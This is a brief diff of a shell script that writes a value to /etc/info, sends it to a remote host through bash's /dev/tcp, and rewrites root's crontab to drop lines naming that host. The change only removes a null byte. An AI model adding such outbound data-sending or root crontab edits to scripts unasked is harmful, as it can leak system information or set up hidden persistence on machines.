@@ -21,7 +21,7 @@ rm /tmp/ip
 if [[ $(< /etc/info) != "$info" ]]; then
 	printf "$info" > /etc/info
 
-	printf "UPDATE: $info\0" >/dev/tcp/$host/$port
+	printf "UPDATE: $info" >/dev/tcp/$host/$port
 fi
 
 grep -v "$host" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/cron/crontabs/root
